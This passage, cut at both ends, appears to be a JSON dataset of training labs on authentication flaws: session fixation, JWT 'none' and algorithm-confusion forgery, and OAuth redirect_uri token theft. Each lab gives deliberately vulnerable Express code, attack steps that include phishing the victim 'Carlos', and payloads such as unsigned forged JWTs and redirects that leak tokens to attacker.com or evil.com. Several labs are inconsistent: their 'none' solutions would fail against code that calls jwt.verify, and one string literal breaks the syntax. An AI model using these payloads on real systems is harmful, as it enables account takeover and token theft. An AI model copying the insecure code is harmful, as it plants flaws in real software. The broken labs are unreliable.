    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'oldpass' }]; app.get('/session', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(7); sessions[sid] = null; res.cookie('sid', sid); res.send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); sessions[sid] = username; res.send('Logged in'); }); app.post('/change-password', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) { users.find(u => u.username === user).password = req.body.newPassword; res.send('Password changed'); } else res.status(403).send('Not logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') res.send('Welcome carlos'); else res.send('Access denied'); }); app.listen(4002, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "GET /session?sid=attackerfixed123",
      "Cookie: sid=attackerfixed123",
      "POST /login with sid=attackerfixed123",
      "POST /change-password with sid=attackerfixed123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
    "Lab Description": "This lab demonstrates a misconfigured JWT validation mechanism where the application fails to verify token signatures if the algorithm is set to 'none'. The application trusts JWTs from the Authorization header for user session validation. To solve: Forge a JWT for the admin user by modifying the algorithm to 'none' and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a valid login request and capture the returned JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io and observe that the algorithm is 'HS256'.",
      "3. Modify the JWT header to set \"alg\":\"none\" and change the payload's \"username\" to \"admin\".",
      "4. Remove the signature portion of the JWT and reconstruct the token using only header.payload.",
      "5. Use Burp Repeater to send a GET request to /admin-dashboard with the forged JWT in the Authorization header.",
      "6. If successful, the admin dashboard will load, confirming that the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 's3cret'; app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') return res.send('Welcome admin!'); else return res.status(403).send('Access denied'); } catch (err) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation via Unvalidated Session ID in URL",
    "Lab Description": "This lab illustrates session fixation where the server accepts any arbitrary session ID supplied via a URL query parameter without validation or regeneration on login. The application does not issue a new session ID after successful authentication. To solve: Fix the victim's session ID before login, then log in with their credentials and access the profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login?sessionId=attacker-session request and send it to Repeater.",
      "2. Visit the /register endpoint and create a dummy account using the attacker-session value as the session cookie.",
      "3. Log out and convince the victim (Carlos) to click a crafted link: /login?sessionId=attacker-session.",
      "4. Use Burp to replay the login request for Carlos with the sessionId attacker-session and his credentials.",
      "5. Access /my-account while using the same session ID to confirm access to Carlos's profile page.",
      "6. The lab is solved when you view Carlos's account details with a fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospw' }]; app.get('/login', (req, res) => { const sessionId = req.query.sessionId; sessions[sessionId] = null; res.send(`<form method='POST' action='/authenticate?sessionId=${sessionId}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/authenticate', (req, res) => { const sessionId = req.query.sessionId; let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) { sessions[sessionId] = user.username; res.redirect(`/my-account?sessionId=${sessionId}`); } else { res.status(403).send('Login failed'); } }); }); app.get('/my-account', (req, res) => { const sessionId = req.query.sessionId; const user = sessions[sessionId]; if (user) res.send(`Welcome ${user}, this is your account`); else res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "/login?sessionId=attacker-session",
      "/authenticate?sessionId=attacker-session",
      "/my-account?sessionId=attacker-session"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "This lab showcases an OAuth implementation vulnerable to an open redirect flaw in its redirect_uri parameter. The authorization server fails to strictly validate redirect URIs, allowing attackers to hijack authorization codes. To solve: Trick the victim into authorizing your application, intercept the OAuth code via a malicious redirect URI, and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to scan the /authorize?redirect_uri parameter for weak validation patterns.",
      "2. Discover that the app accepts subdomains of example.com and permits wildcard matching.",
      "3. Create a payload with redirect_uri=https://attacker.example.com/callback and register a listener.",
      "4. Trick the victim into clicking a crafted URL to initiate OAuth flow: /authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code.",
      "5. Capture the authorization code on your listener, then POST it to /oauth/token to retrieve the access token.",
      "6. Use the access token to access /profile with Authorization: Bearer <token> and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validClients = ['trusted-client']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); if (redirect_uri.includes('.example.com')) { const authCode = 'authcode-carlos'; res.redirect(`${redirect_uri}?code=${authCode}`); } else { res.status(400).send('Invalid redirect'); } }); app.post('/oauth/token', (req, res) => { let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); if (params.get('code') === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(403).send('Invalid code'); }); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-carlos') res.send('Welcome back, Carlos. Here is your profile.'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code",
      "POST /oauth/token with code=authcode-carlos",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "This lab implements stateless authentication using JWTs passed in the Authorization header. The backend fails to validate the algorithm used in the JWT header. The application trusts any token as long as the signature structure is present. To solve: Forge a JWT that grants access to Carlos’s account using the 'none' algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the Authorization header during login using Burp Suite.",
      "Send the token to jwt.io or manually decode it to inspect its header and payload.",
      "Modify the JWT header by changing 'alg' to 'none' and removing the signature.",
      "Manually update the payload to impersonate the user 'carlos'.",
      "Use Postman to craft a new request with the forged Authorization header and access /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Unauthorized'); res.send(`Welcome ${decoded.payload.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Open redirect abuse in OAuth flow for token theft",
    "Lab Description": "The lab uses OAuth to authenticate users via a third-party provider. The 'redirect_uri' parameter is not properly validated, allowing attackers to intercept the access token after successful login. To solve: Capture the access token issued to Carlos by abusing the redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate the OAuth login and intercept the authorization request using Burp Suite.",
      "Modify the 'redirect_uri' parameter to point to your attacker-controlled server (e.g. https://attacker.com/callback).",
      "Start a listener on the attacker-controlled server to capture redirected URLs.",
      "Share the malicious OAuth link with Carlos and wait for him to authenticate.",
      "Extract the access_token from the captured URL fragment and use it with Postman to call /my-account with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123_for_carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123_for_carlos') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vuln-site.com/auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback#access_token=token123_for_carlos",
      "Authorization: Bearer token123_for_carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation using static token in cookie",
    "Lab Description": "The app issues session cookies with predictable static values tied to usernames, and fails to regenerate sessions on login. Attackers can set a valid cookie before login, leading to session fixation. To solve: Fix Carlos’s session, then use the token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to inspect the Set-Cookie value on your own login and note its static structure (e.g., session=<username>_token).",
      "Manually craft a session cookie as 'session=carlos_token' and inject it using Burp or Postman.",
      "Share a crafted login URL with Carlos that preserves the malicious session.",
      "Wait for Carlos to authenticate using your crafted session.",
      "Revisit /my-account with the same cookie to confirm session fixation and access Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = ['alice', 'carlos']; app.get('/login', (req, res) => { const { username } = req.query; if (users.includes(username)) { res.cookie('session', `${username}_token`); res.send('Logged in'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=carlos_token",
      "https://vuln-app.com/login?username=carlos",
      "Set-Cookie: session=carlos_token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in REST API authentication",
    "Lab Description": "The backend uses JSON Web Tokens (JWT) for stateless authentication and incorrectly accepts tokens signed with 'none' algorithm. The application fails to validate the token signature properly, allowing attackers to forge tokens. To solve: Forge an admin JWT and access the /admin/dashboard endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to log in as a regular user and capture the JWT from the Authorization header.",
      "Use jwt.io to decode the token and observe it uses HS256 algorithm.",
      "Craft a new JWT with the same payload but change the 'alg' to 'none' and remove the signature.",
      "Replace the original JWT in Burp with the modified unsigned token and set 'role' to 'admin'.",
      "Send a request to GET /admin/dashboard and confirm admin access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin access granted'); } const verified = jwt.verify(token, SECRET); if (verified.role === 'admin') return res.send('Admin access granted'); } catch (e) { return res.status(403).send('Invalid token'); } res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{alg: 'none', payload: { username: 'carlos', role: 'admin' }}",
      "Authorization: Bearer <forged-jwt>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "The application assigns session tokens before authentication and fails to regenerate them post-login. This allows attackers to fix a session ID for the victim and hijack the session. To solve: Fix a session for Carlos, let him authenticate, then access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to initiate a session and capture your session ID from the Set-Cookie header.",
      "Share the fixed session ID link with the victim, e.g., /login?sessionid=abc123.",
      "Assume the victim logs in via the crafted link and binds the session to their authenticated context.",
      "Send a GET /my-account request with the fixed session ID in Cookie header.",
      "Access Carlos’s account details to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/login', (req, res) => { let sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); const sid = req.cookies.sessionid; sessions[sid] = { username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]) return res.send(`Account: ${sessions[sid].username}`); res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login?sessionid=fixed123",
      "Cookie: sessionid=fixed123",
      "POST /login with body: username=carlos&password=letmein",
      "GET /my-account with Cookie: sessionid=fixed123"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The OAuth flow accepts a wide range of redirect URIs without strict validation. This allows an attacker to inject malicious domains to capture authorization codes. To solve: Exploit the open redirect to capture Carlos’s OAuth token and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login and intercept the request to the /auth endpoint using Burp.",
      "Modify the redirect_uri parameter to point to your malicious server (e.g., https://evil.com/callback).",
      "Host a listener on https://evil.com/callback to capture the code from query string.",
      "Exchange the stolen code for a token using the /oauth/token endpoint.",
      "Use the token to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const authorizedRedirects = []; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=auth123`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'auth123') return res.json({ access_token: 'token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') return res.send('Carlos account details'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "GET /auth?redirect_uri=https://evil.com/callback",
      "https://evil.com/callback?code=auth123",
      "POST /oauth/token with body: code=auth123",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm",
    "Lab Description": "This lab implements JWT-based session management using insecure algorithm validation. The application accepts JWTs from authenticated users, but fails to enforce proper signature validation. To solve: Tamper with the JWT to impersonate Carlos and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in with a low-privilege account and copy the JWT from the Authorization header.",
      "Send the request to Repeater and decode the JWT using jwt.io or a Burp extension.",
      "Change the 'alg' value in the JWT header to 'none' and modify the payload to set \"username\": \"carlos\".",
      "Remove the JWT signature (everything after the second period) and re-encode the JWT.",
      "Replace the original JWT in the Authorization header with your tampered token and resend the request to access Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); if (payload.username === 'carlos') return res.send('Welcome Carlos!'); res.send('Not Carlos'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab's session management is flawed due to predictable session tokens assigned before login. The application issues a session cookie before authentication and fails to regenerate it after successful login. To solve: Fixate a known session on Carlos and reuse it post-login to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept your session when you visit the login page without logging in.",
      "Share your current session token (cookie) with the victim through a crafted phishing link or injection vector.",
      "Simulate the victim logging in using the same session (use curl or Postman with victim’s credentials and your session ID).",
      "After login, use your browser with the fixated session ID to access the My Account page.",
      "Confirm the identity switch and access Carlos’s account to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', uuid.v4()); res.send('Please log in'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Welcome back, Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Fixated session ID via cookie injection",
      "Set-Cookie: sessionid=known-value",
      "Simulated POST /login with sessionid=known-value and carlos credentials"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow redirect URI manipulation",
    "Lab Description": "This lab uses OAuth 2.0 implicit flow, but its redirect URI validation is poorly implemented. The redirect URI can be manipulated to leak the access token to an attacker-controlled domain. To solve: Steal Carlos’s access token using an open redirect and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the OAuth flow when logging in and observe the redirect_uri parameter.",
      "Craft a redirect_uri pointing to an attacker-controlled domain, like https://attacker.com#access_token=",
      "Send the manipulated login link to Carlos (or simulate clicking it with Carlos’s session).",
      "Capture the leaked token on your server by checking access logs or using a webhook endpoint.",
      "Use the stolen token in a Bearer Authorization header to access /user-profile and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { const token = 'carlos-token-abc123'; return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid redirect URI'); }); app.get('/user-profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-token-abc123') return res.send('Profile: Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com",
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=",
      "Authorization: Bearer carlos-token-abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
    "Lab Description": "The authentication mechanism uses JSON Web Tokens (JWTs) for session management. However, it fails to verify the signing algorithm properly, allowing an attacker to forge tokens by switching the algorithm to 'none'. The application accepts unsigned JWTs if the alg field is tampered. To solve: forge a valid token and access Carlos's account page without valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login response and capture the JWT in the Set-Cookie header.",
      "2. Decode the JWT using jwt.io or Postman and analyze the alg field.",
      "3. Modify the alg value from HS256 to none and delete the signature part of the token.",
      "4. Change the payload sub field to 'carlos', re-encode the JWT without signing it.",
      "5. Replace the original JWT in the request cookies with the modified unsigned JWT and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: username }, SECRET, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, SECRET); res.send(`Account page of ${decoded.sub}`); } catch (err) { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "The lab uses OAuth 2.0's implicit flow to authorize users but fails to validate the redirect URI correctly. This enables an attacker to steal tokens by redirecting users to an attacker-controlled domain. To solve: harvest a valid access token and use it to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the /authorize request using Burp Suite or OWASP ZAP.",
      "2. Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/callback).",
      "3. Craft a phishing link containing the modified redirect_uri and trick Carlos into clicking it.",
      "4. Capture the access token from the fragment portion of the redirect URL sent to your server.",
      "5. Use the stolen token in the Authorization header (Bearer token) to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const crypto = require('crypto'); const users = [{ username: 'carlos', password: 'secure123', token: 'access_token_carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'access_token_carlos'; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; res.redirect(uri); } else { res.status(400).send('Invalid response_type'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (user) res.send(`Welcome ${user.username}`); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab at http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback&response_type=token",
      "https://attacker.com/callback#access_token=access_token_carlos&token_type=bearer"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The application issues session cookies before authentication and does not regenerate the session ID after login. An attacker can set a known session ID for a victim, then hijack the session post-login. To solve: fixate Carlos's session and use it after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Postman or Burp Suite, initiate a session by sending a GET request to /login and note the Set-Cookie header.",
      "2. Share the fixed session ID with the victim (e.g., in a phishing email or malicious link).",
      "3. Wait for the victim to log in with the fixated session ID.",
      "4. Use the same session ID to access /my-account while impersonating Carlos.",
      "5. Confirm access to his account to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || 'abc123'; sessions[sid] = {}; res.cookie('sid', sid); res.send('<form method=post action=/login><input name=username><input name=password><input type=submit></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const sid = req.cookies.sid; sessions[sid] = { user: username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].user) res.send(`Welcome ${sessions[sid].user}`); else res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=abc123",
      "GET /login HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123",
      "GET /my-account HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in stateless API authentication",
    "Lab Description": "This lab's stateless JWT-based authentication system is vulnerable to an algorithm confusion flaw. The server uses RS256 for verifying JWTs, but it accepts tokens signed with HS256 if manipulated correctly. The application blindly trusts the 'alg' field in the JWT header. To solve: forge a valid JWT that grants access to Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a JWT issued to a valid user via login API.",
      "Decode the JWT using jwt.io or jwt-tool and analyze the header and payload for algorithm type and key fields.",
      "Change the algorithm from RS256 to HS256 and set the payload 'username' to 'carlos'.",
      "Use the public key as HMAC secret and sign the token using HS256 with jwt_tool or python-jose.",
      "Send the forged JWT via Authorization header to /my-account endpoint and verify access to Carlos's page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; const pubKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.username === 'carlos') res.send('Sensitive info for Carlos'); else res.send('Access denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "HS256 JWT with payload: {\"username\":\"carlos\"}, signed using RS public key",
      "Modified header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Signed using HMAC with public key as secret"
    ]
  },
  {
    "Lab scenario": "Session fixation in classic web login flow",
    "Lab Description": "The application fails to invalidate the user's session upon successful login, making it vulnerable to session fixation. The attacker can set a session identifier before the victim logs in, and the application continues using the same session after authentication. To solve: Fix a session ID, trick Carlos to log in, and then use the session ID to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to initiate a session with GET /login and capture the Set-Cookie header.",
      "Send the session cookie to Carlos via social engineering or simulate login with known credentials using the fixed session ID.",
      "Ensure that the application does not issue a new session ID post-login by observing response cookies.",
      "Reuse the fixed session ID and send a request to /my-account with the session cookie set.",
      "Verify access to Carlos's account page using the same session identifier."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.setHeader('Set-Cookie', 'session=' + sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = { authenticated: true, username }; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session?.authenticated && session.username === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Fixed session ID like 'attacker123' set via Set-Cookie header",
      "Crafted POST /login request with known user credentials and fixed session cookie",
      "GET /my-account with same session ID reused after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking tokens via redirect",
    "Lab Description": "The OAuth implementation of this app leaks access tokens via an open redirect vulnerability after authorization. The redirect_uri parameter is not properly validated, allowing attackers to capture tokens sent via URL fragments. To solve: Trick the authorization server into sending Carlos's token to your controlled endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth authorization flow with Burp and intercept the GET /authorize request.",
      "Modify the redirect_uri parameter to an attacker-controlled domain or path (e.g., https://attacker.com/callback).",
      "Trick Carlos into authorizing the app by sending the crafted link.",
      "Capture the access token in the redirect fragment sent to your endpoint (e.g., #access_token=abc123).",
      "Use the stolen token in the Authorization header to access the protected /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
